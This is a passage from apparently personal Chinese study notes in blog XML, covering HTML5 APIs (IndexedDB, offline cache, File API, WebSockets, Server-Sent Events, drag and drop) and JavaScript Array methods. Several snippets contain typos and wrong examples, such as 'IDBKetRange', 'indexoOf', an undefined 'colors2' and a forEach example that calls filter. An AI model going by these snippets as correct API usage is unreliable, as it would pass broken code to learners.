= tx.objectStore(&apos;User&apos;);</span><br><span class="line">    </span><br><span class="line">    //保存数据</span><br><span class="line">    var value = &#123;</span><br><span class="line">        userId:1,</span><br><span class="line">        userName: &apos;张三&apos;,</span><br><span class="line">        address: &apos;住址&apos;</span><br><span class="line">    &#125;;</span><br><span class="line">    var req = store.put(value);  //会覆盖</span><br><span class="line">    //or</span><br><span class="line">    var req = store.add(value);  //不会覆盖</span><br><span class="line">    req.oncomplete = function(e)&#123;&#125;;</span><br><span class="line">    req.onabort = function(e)&#123;&#125;;</span><br><span class="line"></span><br><span class="line">    //获取数据</span><br><span class="line">    var req = store.get(1);</span><br><span class="line">    var idx = store.index(&apos;userNameIndex&apos;);</span><br><span class="line">    var req = idx.get(&apos;张三&apos;);</span><br><span class="line"></span><br><span class="line">    //根据索引检索</span><br><span class="line">    var range = IDBKetRange.bound(&apos;用户A&apos;,&apos;用户D&apos;);</span><br><span class="line">    var direction = &quot;next&quot;;</span><br><span class="line">    var req = idx.openCursor(range,direction);</span><br><span class="line"></span><br><span class="line">    //统计对象数据数量</span><br><span class="line">    var req = store.count();</span><br><span class="line">&#125;</span><br><span class="line">dbConnect.onerror = function(e)&#123;</span><br><span class="line">&#125;</span><br><span class="line">dbConnect.onupgradeneeded = function(e)&#123;</span><br><span class="line">    idb = e.target.result;</span><br><span class="line">    </span><br><span class="line">    //创建仓库</span><br><span class="line">    var tx = e.target.transaction;</span><br><span class="line">    var name = &apos;User&apos;;</span><br><span class="line">    var optionalParameters = &#123;</span><br><span class="line">        keyPath: &apos;userId&apos;,</span><br><span class="line">        autoIncrement: false</span><br><span class="line">    &#125;;</span><br><span class="line">    var store = idb.createObjectStore(name,optionalParameters);</span><br><span class="line"></span><br><span class="line">    //创建索引</span><br><span class="line">    var name = &apos;userNameIndex&apos;;</span><br><span class="line">    var keyPath = &apos;userName&apos;;</span><br><span class="line">    var optionalParameters = &#123;</span><br><span class="line">        unique: false,</span><br><span class="line">        multiEntry: false</span><br><span class="line">    &#125;;</span><br><span class="line">    var idx = store.createIndex(name,keyPath,optionalParameters);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="离线存储"><a href="#离线存储" class="headerlink" title="离线存储"></a>离线存储</h2><h3 id="manifest文件"><a href="#manifest文件" class="headerlink" title="manifest文件"></a>manifest文件</h3><p>列举了需要被缓存或不需要被缓存的资源文件的名称，以及这些资源文件的访问路径。</p><h3 id="applicationCache对象"><a href="#applicationCache对象" class="headerlink" title="applicationCache对象"></a>applicationCache对象</h3><h4 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">applicationCache.onchecking = function(e)&#123;&#125;;</span><br><span class="line">applicationCache.onnoupdate = function(e)&#123;&#125;;</span><br><span class="line">applicationCache.ondownloading = function(e)&#123;&#125;;</span><br><span class="line">applicationCache.onprogress = function(e)&#123;&#125;;</span><br><span class="line">applicationCache.onUpdateReady = function(e)&#123;&#125;;</span><br><span class="line">applicationCache.oncached = function(e)&#123;&#125;;</span><br><span class="line">applicationCache.onerror = function(e)&#123;&#125;;</span><br></pre></td></tr></table></figure><h4 id="swapCache"><a href="#swapCache" class="headerlink" title="swapCache"></a>swapCache</h4><p>立即更新本地缓存。</p><h2 id="文件API"><a href="#文件API" class="headerlink" title="文件API"></a>文件API</h2><h3 id="FileList对象与file对象"><a href="#FileList对象与file对象" class="headerlink" title="FileList对象与file对象"></a>FileList对象与file对象</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var file;</span><br><span class="line">for(var i = 0;i&lt;document.geElementById(&quot;file&quot;).files.length;i++)&#123;</span><br><span class="line">    file = document.getElementById(&quot;file&quot;).files[i];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ArrayBuffer"><a href="#ArrayBuffer" class="headerlink" title="ArrayBuffer"></a>ArrayBuffer</h3><p>用于二进制数据缓存字符串。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var buf = new ArrayBuffer(32);</span><br></pre></td></tr></table></figure></p><h4 id="ArrayBufferView对象"><a href="#ArrayBufferView对象" class="headerlink" title="ArrayBufferView对象"></a>ArrayBufferView对象</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var Int32Array = new Int32Array(ArrayBuffer);</span><br></pre></td></tr></table></figure><h4 id="DataView对象"><a href="#DataView对象" class="headerlink" title="DataView对象"></a>DataView对象</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var view = new DataView((uffer,byteOffset,byteLength);</span><br></pre></td></tr></table></figure><h4 id="Blob对象"><a href="#Blob对象" class="headerlink" title="Blob对象"></a>Blob对象</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var blob = new Blob ([blobParts,type]);</span><br><span class="line">var newBlob = blob.slice(start,end,contentType);</span><br></pre></td></tr></table></figure><h3 id="FileReader对象"><a href="#FileReader对象" class="headerlink" title="FileReader对象"></a>FileReader对象</h3><p>用来把文件读入内存，并且读取文件中的数据。</p><h4 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h4><ul><li>readAsText：以文本方式读取，读取的结果即这个文本文件中的内容</li><li>readAsBinaryString：读取为二进制字符串</li><li>readAsDataURL：读取一串Data URL字符串</li><li>readyArrayBuffer：读取为一个ArrayBuffer</li></ul><h4 id="事件-1"><a href="#事件-1" class="headerlink" title="事件"></a>事件</h4><ul><li>onabort()</li><li>onprogress()</li><li>onerror()</li><li>onload()</li><li>onloadstart()</li><li>onloadend()</li></ul><h3 id="FileSystem-API"><a href="#FileSystem-API" class="headerlink" title="FileSystem API"></a>FileSystem API</h3><p>用于用户需要永久保存数据，但是本地数据库的利用不能满足用户需求。</p><h4 id="适用场合"><a href="#适用场合" class="headerlink" title="适用场合"></a>适用场合</h4><ul><li>文件分段上传</li><li>在视频游戏或其他使用大量与媒体数据相关的应用程序中</li><li>在离线或使用本地缓存的音频编辑或图片编辑应用程序中</li><li>离线视频播放器</li><li>离线邮件客户端</li></ul><h4 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h4><ul><li>请求访问文件系统：<br>window.requestFileSystem(type,size,successCallback,opt_errorCallback)</li><li>申请磁盘配额：<br>window.webkitStorageInfo.requestQuota(PERSISTENT,1024*1024,successHandler,errorHandler)</li><li>创建文件：<br>fs.root.getFile(filename,{create:true},successHandler,errorHandler)</li><li>写入文件：fileEntry.createWriter(successHandler,errorHandler)</li><li>在文件中追加数据：fileWriter.seek(fileWrer.length)</li><li>读取文件：fileEntry.file(successHandler,errorHandler)</li><li>复制磁盘中的文件：fileWriter.write(file);</li><li>删除文件：fileEntry.remove(successHandler,errorHandler)</li><li>创建目录：<br>fs.root.getDirectory(path,{create:true},successHandler,errorHandler)</li><li>读取目录中的内容：<br>fs.root.createReader().readEntries(successHandler,errorHandler)</li><li>删除目录：dirEntry.remove(successHandler,errorHandler)</li><li>复制文件或目录：<br>fileEntry.copyTo(parent,newName,successHandler,errorHandler)</li><li>移动文件或目录与重命名文件或目录：<br>fileEntry.moveTo(parent,newName,successHandler,errorHandler)</li></ul><h3 id="Base64编码支持"><a href="#Base64编码支持" class="headerlink" title="Base64编码支持"></a>Base64编码支持</h3><ul><li>理解为二进制：window.btoa</li><li>理解为ASCII码：window.atob</li></ul><h2 id="通信-API"><a href="#通信-API" class="headerlink" title="通信 API"></a>通信 API</h2><h3 id="跨文本信息传输"><a href="#跨文本信息传输" class="headerlink" title="跨文本信息传输"></a>跨文本信息传输</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">window.addEventListener(&quot;message&quot;,function()&#123;...&#125;,false);</span><br><span class="line">otherWindow.postMessage(message,targetOrigin);</span><br></pre></td></tr></table></figure><h3 id="WebSockets"><a href="#WebSockets" class="headerlink" title="WebSockets"></a>WebSockets</h3><h4 id="实现方法"><a href="#实现方法" class="headerlink" title="实现方法"></a>实现方法</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var webSocket = new WebSocket(&quot;ws://localhost:8005/socket&quot;);</span><br><span class="line">webSocket.send(&quot;data&quot;);</span><br><span class="line">webSocket.onmessage = function(event)&#123;&#125;;</span><br><span class="line">webSocket.onopen = function(event)&#123;&#125;;</span><br><span class="line">webSocket.onclose = function(event)&#123;&#125;;</span><br></pre></td></tr></table></figure><h4 id="发送对象"><a href="#发送对象" class="headerlink" title="发送对象"></a>发送对象</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">webSocket.send(JSON.stringify(&#123;</span><br><span class="line">    result: successFlag,</span><br><span class="line">    time: currentTime</span><br><span class="line">&#125;));</span><br></pre></td></tr></table></figure><h4 id="适用场景"><a href="#适用场景" class="headerlink" title="适用场景"></a>适用场景</h4><ul><li>多人在线游戏网站</li><li>聊天室</li><li>实时体育或新闻评论网站</li><li>实时交互用户信息的社交网站</li></ul><h3 id="Server-Sent-Events-API"><a href="#Server-Sent-Events-API" class="headerlink" title="Server-Sent Events API"></a>Server-Sent Events API</h3><h4 id="适用场景-1"><a href="#适用场景-1" class="headerlink" title="适用场景"></a>适用场景</h4><ul><li>在股票软件中实时显示股票的在线数据</li><li>在新闻网站中实时显示最近刚刚发生的重大新闻</li><li>在在线聊天软件中实时显示当前聊天室中的用户名及用户人数</li><li>在其他任何需要实时显示服务端数据的场合</li></ul><h4 id="实现方法-1"><a href="#实现方法-1" class="headerlink" title="实现方法"></a>实现方法</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var source = new EventSource(&quot;test.php&quot;,&#123;withCredentials:true&#125;);</span><br><span class="line">source.close();</span><br><span class="line">source.onmessage = function(e)&#123;&#125;;</span><br><span class="line">source.onopen = function(e)&#123;&#125;;</span><br><span class="line">source.onerror = function(e)&#123;&#125;;</span><br></pre></td></tr></table></figure><h2 id="拖放-API"><a href="#拖放-API" class="headerlink" title="拖放 API"></a>拖放 API</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">var target = document.querySelector(&apos;#drop-target&apos;);</span><br><span class="line">var dragElements = document.querySelectorAll(&apos;#drag-elements li&apos;);</span><br><span class="line"></span><br><span class="line">// 追踪被拖动元素的变量</span><br><span class="line">var elementDragged = null;</span><br><span class="line"></span><br><span class="line">for (var i = 0; i &lt; dragElements.length; i++) &#123;</span><br><span class="line"></span><br><span class="line">  dragElements[i].addEventListener(&apos;dragstart&apos;, function(e) &#123;</span><br><span class="line">    e.dataTransfer.setData(&apos;text&apos;, this.innerHTML);</span><br><span class="line">    elementDragged = this;</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  dragElements[i].addEventListener(&apos;dragend&apos;, function(e) &#123;</span><br><span class="line">    elementDragged = null;</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">target.addEventListener(&apos;dragover&apos;, function(e) &#123;</span><br><span class="line">  e.preventDefault();</span><br><span class="line">  e.dataTransfer.dropEffect = &apos;move&apos;;</span><br><span class="line">  return false;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">target.addEventListener(&apos;drop&apos;, function(e) &#123;</span><br><span class="line">  e.preventDefault(); </span><br><span class="line">  e.stopPropagation();</span><br><span class="line"></span><br><span class="line">  this.innerHTML = &quot;Dropped &quot; + e.dataTransfer.getData(&apos;text&apos;);</span><br><span class="line"></span><br><span class="line">  document.querySelector(&apos;#drag-elements&apos;).removeChild(elementDragged);</span><br><span class="line"></span><br><span class="line">  return false;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JS引用类型</title>
      <link href="/JS%E5%BC%95%E7%94%A8%E7%B1%BB%E5%9E%8B.html"/>
      <url>/JS%E5%BC%95%E7%94%A8%E7%B1%BB%E5%9E%8B.html</url>
      
        <content type="html"><![CDATA[<h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>引用类型的值（对象）是引用类型的一个实例。<br>引用类型是一种数据结构，用于将数据和功能组织在一起。</p><h2 id="Object类型"><a href="#Object类型" class="headerlink" title="Object类型"></a>Object类型</h2><h3 id="创建方式："><a href="#创建方式：" class="headerlink" title="创建方式："></a>创建方式：</h3><p>使用new操作符后跟Object构造函数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var person = new Object();   //与 var person = &#123;&#125; 等同</span><br><span class="line">person.name = &quot;Nicholas&quot;;</span><br><span class="line">person.age = 29;</span><br></pre></td></tr></table></figure></p><a id="more"></a><p>使用对象字面量表示法。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var person = &#123;</span><br><span class="line">    name : &quot;Nicholas&quot;,</span><br><span class="line">    age : 29  //在最后一个属性后面添加逗号，会在IE7及更早版本的Opera中导致错误</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="访问属性："><a href="#访问属性：" class="headerlink" title="访问属性："></a>访问属性：</h3><p>使用点表示法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert(person.name);</span><br></pre></td></tr></table></figure></p><p>使用方括号语法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert(person[&quot;name&quot;]);</span><br></pre></td></tr></table></figure></p><p>使用方括号访问的优点：</p><ul><li>可以通过变量来访问</li><li>如果属性名中包含会导致错误语法的字符，或使用关键字，保留字，可以用方括号</li></ul><p>除非必须使用变量来访问属性，否则我们建议使用点表示法。</p><h2 id="Array类型"><a href="#Array类型" class="headerlink" title="Array类型"></a>Array类型</h2><h3 id="特点："><a href="#特点：" class="headerlink" title="特点："></a>特点：</h3><p>ECMAScript数组的每一项可以保存在任何类型的数据<br>ECMAScript数组的大小是可以动态调整的</p><h3 id="创建方式：-1"><a href="#创建方式：-1" class="headerlink" title="创建方式："></a>创建方式：</h3><p>使用Array构造函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var colors = new Array(3);</span><br><span class="line">var colors = new Array(&quot;Greg&quot;);</span><br></pre></td></tr></table></figure></p><p>使用数组字面量<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var colors = [&quot;red&quot;,&quot;blue&quot;,&quot;green&quot;];</span><br></pre></td></tr></table></figure></p><h3 id="读取方式和设置数组："><a href="#读取方式和设置数组：" class="headerlink" title="读取方式和设置数组："></a>读取方式和设置数组：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var colors = [&quot;red&quot;,&quot;blue&quot;,&quot;green&quot;];</span><br><span class="line">alert(colors[[0]]);</span><br><span class="line">colors[2] = &quot;black&quot;;</span><br></pre></td></tr></table></figure><h3 id="检测数组："><a href="#检测数组：" class="headerlink" title="检测数组："></a>检测数组：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(Array.isArray(value))&#123;&#125;</span><br></pre></td></tr></table></figure><h3 id="转换方法："><a href="#转换方法：" class="headerlink" title="转换方法："></a>转换方法：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var colors = [&quot;red&quot;,&quot;blue&quot;,&quot;green&quot;];</span><br><span class="line">alert(colors.toString());   //red,blue,green</span><br><span class="line">alert(colors.valueOf());    //red,blue,green</span><br><span class="line">alert(colors);              //red,blue,green</span><br><span class="line">alert(colors.join(&quot;,&quot;));    //red,blue,green</span><br><span class="line">alert(colors.join(&quot;||&quot;));   //red||blue||green</span><br></pre></td></tr></table></figure><h3 id="栈方法："><a href="#栈方法：" class="headerlink" title="栈方法："></a>栈方法：</h3><p>栈是一种LIFO(Last-In-First-Out)的数据结构<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">var colors = new Array();</span><br><span class="line">var count = colors.push(&quot;red&quot;,&quot;green&quot;);</span><br><span class="line">alert(count);   //2</span><br><span class="line">count = colors.push(&quot;black&quot;);</span><br><span class="line">alert(count);   //3</span><br><span class="line">var item = colors.pop();</span><br><span class="line">alert(item);    //&quot;black&quot;</span><br></pre></td></tr></table></figure></p><h3 id="队列方法："><a href="#队列方法：" class="headerlink" title="队列方法："></a>队列方法：</h3><p>队列是一种FIFO(First-in-First-Out)的数据结构<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">var colors = new Array();</span><br><span class="line">var count = colors.push(&quot;red&quot;,&quot;green&quot;);</span><br><span class="line">alert(count);     //2</span><br><span class="line">count = colors.push(&quot;black&quot;);</span><br><span class="line">alert(count);     //3</span><br><span class="line">var item = colors.shift();</span><br><span class="line">alert(item);      //red</span><br><span class="line">var colors = new Array();</span><br><span class="line">var count = colors.unshift(&quot;red&quot;,&quot;green&quot;);</span><br><span class="line">count = colors.unshift(&quot;black&quot;);</span><br><span class="line">alert(colors);    //black,red,green</span><br><span class="line">var item = colors.pop();</span><br><span class="line">alert(item);      //green</span><br></pre></td></tr></table></figure></p><h3 id="重排序方法："><a href="#重排序方法：" class="headerlink" title="重排序方法："></a>重排序方法：</h3><h4 id="function-reverse"><a href="#function-reverse" class="headerlink" title="function reverse:"></a>function reverse:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var values= [1,2,3,4,5];</span><br><span class="line">values.reverse();</span><br><span class="line">alert(values);   //5,4,3,2,1</span><br></pre></td></tr></table></figure><h4 id="function-sort"><a href="#function-sort" class="headerlink" title="function sort:"></a>function sort:</h4><p>在执行sort方法前，会先调用toString()转型，然后比较得到字符串<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var values = [0,1,5,10,15];</span><br><span class="line">values.sort();</span><br><span class="line">alert(values);   //0,1,10,15,5</span><br></pre></td></tr></table></figure></p><p>添加比较函数，如果第一个参数应该位于第二个参数前，返回负数，否则返回正数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">function compare(value1,value2)&#123;</span><br><span class="line">    if(value1 &lt; value2)&#123;</span><br><span class="line">        return -1;</span><br><span class="line">    &#125;</span><br><span class="line">    else if(value1 &gt; value2)&#123;</span><br><span class="line">        return 1;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">values.sort(compare);  //0,1,5,10,15</span><br></pre></td></tr></table></figure></p><p>数值类型可以用更简单的比较函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function compare(value1,value2)&#123;   //升序</span><br><span class="line">    return value1 - value2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="操作方法："><a href="#操作方法：" class="headerlink" title="操作方法："></a>操作方法：</h3><h4 id="function-concat"><a href="#function-concat" class="headerlink" title="function concat:"></a>function concat:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var colors = [&quot;red&quot;,&quot;green&quot;,&quot;blue&quot;];</span><br><span class="line">var colors = colors.concat(&quot;yellow&quot;,[&quot;black&quot;,&quot;brown&quot;]);</span><br><span class="line">alert(colors);    //red,green,blue</span><br><span class="line">alert(colors2);   //red,green,blue,yellow,black,brown</span><br></pre></td></tr></table></figure><p>这个方法会先创建当前数组的一个副本，然后将接收的参数添加到这个副本的末尾，最后返回新构建的数组</p><h4 id="function-slice"><a href="#function-slice" class="headerlink" title="function slice:"></a>function slice:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var colors = [&quot;red&quot;,&quot;green&quot;,&quot;blue&quot;,&quot;yellow&quot;,&quot;purple&quot;];</span><br><span class="line">var colors2 = colors.slice(1);</span><br><span class="line">var colors3 = colors.slice(1,4);</span><br><span class="line">alert(colors2);   //green,blue,yellow,purple</span><br><span class="line">alert(colors3);   //green,blue,yellow</span><br></pre></td></tr></table></figure><p>能够基于当前数组中的一或多个项创建一个新数组，slice方法不会影响原始数组</p><h4 id="function-splice"><a href="#function-splice" class="headerlink" title="function splice:"></a>function splice:</h4><p>删除、插入、替换，用于向数组中部插入项<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var colors = [&quot;red&quot;,&quot;green&quot;,&quot;blue&quot;];</span><br><span class="line">var removed = colors.splice(0,1);   //删除一项</span><br><span class="line">alert(colors);    //green,blue</span><br><span class="line">alert(removed);   //red</span><br><span class="line">removed = colors.splice(1,0,&quot;yellow&quot;,&quot;orange&quot;);   //插入两项</span><br><span class="line">alert(colors);    //green,yellow,orange,blue</span><br><span class="line">alert(removed);   //空数组</span><br><span class="line">removed = colors.splice(1,1,&quot;red&quot;,&quot;purple&quot;);   //替换一项，插入一项</span><br><span class="line">alert(colors);   //green,red,purple,orange,blue</span><br><span class="line">alert(removed);  //yellow</span><br></pre></td></tr></table></figure></p><h3 id="位置方法："><a href="#位置方法：" class="headerlink" title="位置方法："></a>位置方法：</h3><h4 id="function-indexOf"><a href="#function-indexOf" class="headerlink" title="function indexOf:"></a>function indexOf:</h4><p>从数组的开头开始向后查找，比较时会使用全等操作符<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var numbers = [1,2,3,4,5,4,3,2,1];</span><br><span class="line">alert(numbers.indexoOf(4));   //3</span><br><span class="line">alert(numbers.indexOf(4,4))   //第一参数表示要查找的项，第二参数表示查找起始位置</span><br><span class="line">var person = &#123;name:&quot;Nicholas&quot;&#125;;</span><br><span class="line">var people = [&#123;name:&quot;Nicholas&quot;&#125;];</span><br><span class="line">var morePeople = [person];</span><br><span class="line">alert(people.indexOf(person));   //-1</span><br><span class="line">alert(morePeople.indexOf(person));  //0</span><br></pre></td></tr></table></figure></p><h4 id="function-lastIndexOf"><a href="#function-lastIndexOf" class="headerlink" title="function lastIndexOf:"></a>function lastIndexOf:</h4><p>从数组的末尾开始向前查找<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var numbers = [1,2,3,4,5,4,3,2,1];</span><br><span class="line">alert(numbers.lastIndexOf(4));   //5</span><br><span class="line">alert(numbers.lastIndexOf(4,4));   //3</span><br></pre></td></tr></table></figure></p><h3 id="迭代方法："><a href="#迭代方法：" class="headerlink" title="迭代方法："></a>迭代方法：</h3><h4 id="function-every"><a href="#function-every" class="headerlink" title="function every:"></a>function every:</h4><p>对数组中的每一项运行给定函数，如果该函数对每一项都返回true，则返回true<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var numbers = [1,2,3,4,5,4,3,2,1];</span><br><span class="line">var everyResult = numbers.every(function(item,index,array)&#123;</span><br><span class="line">    return (item&gt;2);</span><br><span class="line">&#125;);</span><br><span class="line">alert(everyResult);  //false</span><br></pre></td></tr></table></figure></p><h4 id="function-filter"><a href="#function-filter" class="headerlink" title="function filter:"></a>function filter:</h4><p>对数组中的每一项运行给定函数，返回该函数会返回true的项组成的数组<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var numbers = [1,2,3,4,5,4,3,2,1];</span><br><span class="line">var filterResult = numbers.filter(function(item,index,array)&#123;</span><br><span class="line">    return (item&gt;2);</span><br><span class="line">&#125;);</span><br><span class="line">alert(filterResult);  //[3,4,5,4,3]</span><br></pre></td></tr></table></figure></p><h4 id="function-forEach"><a href="#function-forEach" class="headerlink" title="function forEach:"></a>function forEach:</h4><p>对数组中的每一项运行给定函数，这个方法没有返回值<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var numbers = [1,2,3,4,5,4,3,2,1];</span><br><span class="line">var filterResult = numbers.filter(function(item,index,array)&#123;</span><br><span class="line">    //...</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><h4 id="function-map"><a href="#function-map" class="headerlink" title="function map:"></a>function map:</h4><p>对数组中的每一项运行给定函数，返回每次函数调用的结果组成的数组<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var numbers = [1,2,3,4,5,4,3,2,1];</span><br><span class="line">var mapResult = numbers.map(function(item,index,array)&#123;</span><br><span class="line">    return item*2;</span><br><span class="line">&#125;);</span><br><span class="line">alert(mapResult);  //[2,4,6,8,10,8,6,4,2]</span><br></pre></td></tr></table></figure></p><h4 id="function-some"><a href="#function-some" class="headerlink" title="function some:"></a>function some:</h4><p>对数组中的每一项运行给定函数，如果该函数对任一项返回true，则返回true<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var numbers = [1,2,3,4,5,4,3,2,1];</span><br><span class="line">var someResult = numbers.some(function(item,index,array)&#123;</span><br><span class="line">    return (item&gt;2);</span><br><span class="line">&#125;);</span><br><span class="line">alert(someResult);  //true</span><br></pre></td></tr></table></figure></p><h3 id="缩小方法（归并方法）："><a href="#缩小方法（归并方法）：" class="headerlink" 